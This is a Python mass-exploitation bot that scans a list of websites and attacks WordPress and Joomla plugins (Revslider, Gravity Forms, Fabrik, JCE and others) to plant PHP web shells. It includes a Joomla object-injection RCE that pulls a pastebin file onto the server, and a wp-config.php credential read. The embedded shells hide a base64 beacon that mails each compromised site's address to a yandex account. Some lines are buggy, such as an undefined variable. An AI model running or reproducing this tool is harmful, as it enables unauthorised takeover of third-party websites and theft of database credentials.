# !/usr/bin/python


import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from base64 import b64encode,b64decode
from zlib import compress,decompress
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init

init(autoreset=True)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
#####################
try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))


def banners():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

        banner = """{}{} \n \n





  ______                      _       _     ____            _      __      __  __   ____  
 |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | |___ \ 
    / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | |   __) |
   / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | |  |__ < 
  / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |  ___) |
 /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_| |____/ 
                                                                                          
            [+]  Coded By: Viper 1337
            [+]  ICQ: 744289868
            
     #




		\n""".format(fr, sb)

        print banner


shell_2 = """GIF89a <?php echo 'Raiz0WorM'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>"""

shell = """ <?php echo 'OWNED BY RAIZ0WORM'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>"""

oreo = """ <?php echo 'JSSPWNED!<br/><form action="" method="post" enctype="multipart/form-data" name="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>';
if( $_POST['_upl'] == "U" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '#1~'; }
else { echo '#0~'; }
}
?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>"""

up = 'raiz0.php'

JCEUpload = 'files/XxX.php'

nik = 'files/root.php'

shell_name = str(time.time())[:-3]

filenamex = "Raiz0_" + str(shell_name) + ".php.php"

filename = "Raiz0WorM_" + shell_name + ".php"

ShellPresta = 'files/up.php'

JCE = 'files/vuln.php'

index = 'files/raiz0.php5'

jceupshell = 'files/098.php'

izshell = 'files/shell.jpg'




def exploits(url):
    try:

        filenames = 'Raiz0' + '__' + rand_str(5) + '.php'

        # 1 .   Gravity Forms

        appgrav = {'field_id': '3',
                   'form_id': '1',
                   'gform_unique_id': '../../../../',
                   'name': 'raiz0.php5'}

        Grav = {'file': open(index, 'rb')}

        Gravreq = requests.post(url + '/?gf_page=upload', data=appgrav, files=Grav)

        Gravlib = requests.get(url + '/wp-content/_input_3_raiz0.php')

        if 'Raiz0WorM' in Gravlib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Gravity-Bypass'.format(fw, sb) + ' --->' + '{}{} eXploiting Done !'.format(fg, sb)
            open('Result/index.txt', 'a').write(url + '/wp-content/_input_3_raiz0.php5' + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Gravity-Bypass'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 2 . MOK

        revsliderapp = {'action': 'revslider_ajax_action',
                        'client_action': 'update_plugin'}

        revsliderup = {'update_file': (filenames, shell, 'text/html')}

        revslidereq = requests.post(url + '/wp-admin/admin-ajax.php', data=revsliderapp, files=revsliderup)

        revsliderlib = requests.get(url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames)

        if 'OWNED' in revsliderlib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Revslider'.format(fw, sb) + ' --->' + '{}{} eXploiting Done 2'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(
                url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Revslider'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 23 . 8

        showbizapp = {'action': 'showbiz_ajax_action',
                      'client_action': 'update_plugin'}

        showbizup = {'update_file': (filenames, shell, 'text/html')}

        showbizreq = requests.post(url + '/wp-admin/admin-ajax.php', data=showbizapp, files=showbizup)

        showbizlib = requests.get(url + '/wp-content/plugins/showbiz/temp/update_extract/' + filenames)

        if 'OWNED' in showbizlib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Show-Biz'.format(fw, sb) + ' --->' + '{}{} eXploiting Done'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(
                url + '/wp-content/plugins/revslider/temp/update_extract/' + filenames + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Show-Biz'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 3 . XD

        pl = generate_payload(
            "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('https://pastebin.com/raw/za1Rf1kL'));")

        rce_url(url, pl)

        req_rce = requests.get(url + '/XxX.php?XxX')

        if 'GIF89a;' in req_rce.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} RCE-V1'.format(fw, sb) + ' --->' + '{}{} [Succes Upload <3 !]'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(url + '/XxX.php?XxX' + '\n')
        else:

            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} RCE-V1'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 5 . 0?

        vuln_url = url + '/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../' + filename

        req_b2j = requests.post(vuln_url, data=shell)

        check_lib = requests.get(url + '/components/' + filename)

        if 'OWNED' in check_lib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} B2jContact'.format(
                fw, sb) + ' -->' + '{}{} eXploiting Done'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(url + '/components/' + filename + '\n')


        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} B2jContact'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)


        # 6 . 5

        LearnDashup = {'uploadfiles[]': (filenamex, shell, 'text/html')}

        LearnDashreq = requests.post(url, files=LearnDashup,
                                     data={'post': 'foobar', 'course_id': 'foobar', 'uploadfile': 'foobar'})

        LearnDashlib = requests.get(url + '/wp-content/uploads/assignments/' + filenamex.replace('.php.php', '.php.'))

        if 'OWNED' in LearnDashlib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} LearnDash'.format(fw, sb) + ' --->' + '{}{} eXploiting Done'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(
                url + '/wp-content/uploads/assignments/' + filenamex.replace('.php.php', '.php.') + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} LearnDash'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)
        # 8 . 9

        Cherryup = {'file': (filenames, shell, 'text/html')}

        Cherryreq = requests.post(url + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php',
                                  files=Cherryup)

        Cherrylib = requests.get(url + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames)

        if 'OWNED' in Cherrylib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Cherry-Plugins'.format(fw, sb) + ' --->' + '{}{} Succes Upload <3 '.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(url + '/wp-content/plugins/cherry-plugin/admin/import-export/' + filenames + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Cherry-Plugins'.format(fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 14 . 0

        # 7 . Reflex Gallery

        CheckVULN = requests.get(url + '/components/com_sexycontactform/fileupload/', timeout=10)
        if CheckVULN.status_code == 200:
            Reflexup = {'files[]': open(nik, 'rb')}

            Reflexreq = requests.post(url + '/components/com_sexycontactform/fileupload/', files=Reflexup)

            Reflexlib = requests.get(url + '/com_sexycontactform/fileupload/files/root.php')

            if 'Raiz0WorM' in Reflexlib.content:
                print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} com_sexycontactform'.format(
                fw, sb) + ' --->' + '{}{} [Succes Upload <3 !]'.format(fg, sb)
                open('Result/Shell_Resultas.txt', 'a').write(url + '/com_sexycontactform/fileupload/files/root.php' + '\n')
                sys.exit()
            else:
                print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} com_sexycontactform'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)


        # 9 . 9

        check_fabrik = requests.get(
            url + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload')

        if 'filepath":' in check_fabrik.content:

            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Com_FabriK'.format(
                fw, sb) + ' --->' + '{}{} [eXploited with Success !]'.format(fg, sb)
            open('Result/Fabrik_Vuln.txt', 'a').write(
                url + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload' + '\n')

            com_fabrik = {'file': (filename, shell, 'text/html')}

            req_fabrik = requests.post(
                url + '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload',
                files=com_fabrik)

            Shell_fabrik = requests.get(url + '/' + str(filename))

            if 'OWNED' in Shell_fabrik.content:
                print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Com_FabriK'.format(
                fw, sb) + ' --->' + '{}{} eXploited with Success !'.format(fg, sb)
                open('Result/Shell_Resultas.txt', 'a').write(url + '/' + str(filename) + '\n')
            else:
                print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Com_FabriK'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Com_FabriK'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 10 . 8

        Reflexup = {'qqfile': (filenames, shell_2, 'text/html')}

        Reflexreq = requests.post(
            url + '/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01',
            files=Reflexup)

        Reflexlib = requests.get(url + '/wp-content/uploads/2018/01/' + filenames)

        if 'Raiz0WorM' in Reflexlib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Reflex-Gallery'.format(
                fw, sb) + ' --->' + '{}{} eXploiting Done'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(url + '/wp-content/uploads/2018/01/' + filenames + '\n')
        else:

            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Reflex-Gallery'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 13 . 0

        # 19 . 6

        Wysijaup = {'my-theme': open('files/Master.zip', 'rb')}

        Wysijaapp = {'action': 'themeupload',
                     'submitter': 'Upload',
                     'overwriteexistingtheme': 'on',
                     'page': 'GZNeFLoZAb'}

        Wysijareq = requests.post(url + '/wp-admin/admin-post.php?page=wysija_campaigns&action=themes', data=Wysijaapp,
                                  files=Wysijaapp)

        Wysijalib = requests.get(url + '/wp-content/uploads/wysija/themes/Master/un.php')

        if 'Raiz0WorM' in Wysijalib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Wysija'.format(
                fw, sb) + ' --->' + '{}{} Sucess Upload'.format(fg, sb)
            open('Shell_Resultas.txt', 'a').write(url + '/wp-content/uploads/wysija/themes/Master/un.php' + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Wysija'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)

        # 13 .8

        ri = requests.get(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')

        if 'DB_USER' in ri.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Configs'.format(
                fw, sb) + ' --->' + '{}{} [DOWNLOADED WITH SUCCESS ##]'.format(fg, sb)
            open('Result/ConfigsForCPs.txt', 'a').write(
                url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' + '\n')

        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Configs'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)


        # 1 .   Gravity Forms

        fgappgravkg = {'upload-dir': '../../',
                       'upload-overwrite': '0',
                       'action': 'upload'}

        fgGravkg = {'Filedata': open(nik, 'rb')}

        Gravkgreq = requests.post(
            url + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"',
            data=fgappgravkg, files=fgGravkg)

        fgGravkglib = requests.get(url + '/root.php')

        if 'Raiz0WorM' in fgGravkglib.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} com_jce'.format(
                fw, sb) + ' --->' + '{}{} [eXploited with Sucess ##!]'.format(fg, sb)
            open('Result/Shell_Resultas.txt', 'a').write(url + '/root.php' + '\n')
            sys.exit()
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} com_jce'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)


        # 3 .

        install = requests.get(url + '/wordpress/wp-admin/install.php?step=1', headers=ua, timeout=10)
        if 'Setup Configuration File' in install.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Setup-Configuration'.format(
                fw, sb) + ' --->' + '{}{} [eXploited with Sucess ##!]'.format(fg, sb)
            open('Result/install.txt', 'a').write(url + '/wordpress/wp-admin/install.php?step=1''\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Setup-Configuration'.format(
                fw, sb) + ' --->' + '{}{} Failed'.format(fr, sb)


    except:
        pass


banners()


def rand_str(len=None):
    if len == None:
        len = 8
    return ''.join(rand('abcdefghijklmnopqrstuvwxyz', len))


def toCharCode(string):
    try:
        encoded = ""
        for char in string:
            encoded += "chr({0}).".format(ord(char))
        return encoded[:-1]
    except:
        pass


def rce_url(url, user_agent):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
            'x-forwarded-for': user_agent
        }
        cookies = requests.get(url, headers=headers).cookies
        for _ in range(3):
            response = requests.get(url, headers=headers, cookies=cookies)
        return response

    except:
        pass


def php_str_noquotes(data):
    try:

        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format(ord(char))

        return encoded[:-1]

    except:
        pass


def generate_payload(php_payload):
    try:

        php_payload = "eval({0})".format(php_str_noquotes(php_payload))

        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

        return exploit_template

    except:
        pass


def php_str_noquotes(data):
    try:

        "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format(ord(char))

        return encoded[:-1]

    except:
        pass


def Main():
    try:

        start = timer()
        ThreadPool = Pool(75)
        Threads = ThreadPool.map(exploits, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
